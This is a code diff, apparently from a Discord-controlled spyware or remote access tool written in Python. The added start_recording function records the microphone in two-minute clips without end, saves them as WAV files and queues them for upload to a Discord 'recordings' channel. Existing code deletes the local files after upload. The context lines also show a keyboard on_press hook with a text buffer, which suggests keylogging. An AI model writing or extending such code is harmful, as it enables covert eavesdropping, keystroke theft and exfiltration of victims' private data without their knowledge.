@@ -88,7 +88,7 @@ async def on_ready():
                 await asyncio.sleep(0.1)
                 if file[3]:
                     os.system('del ' + file[2])
-            messages_to_send = []
+            files_to_send = []
         if len(embeds_to_send) > 0:
             for embedd in embeds_to_send:
                 await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1]).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
@@ -116,7 +116,16 @@ async def on_message(message):
     '''
 
 def start_recording():
-    print('asd')
+    global files_to_send, channel_ids
+    while True:
+        recorded_mic = sounddevice.rec(int(120 * 16000), samplerate=16000, channels=1)
+        sounddevice.wait()
+        try: os.mkdir('rec_')
+        except: pass
+        record_name = 'rec_\\' + current_time() + '.wav'
+        write(record_name, 16000, recorded_mic)
+        files_to_send.append([channel_ids['recordings'], '', record_name, True])
+
 
 def on_press(key):
     global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
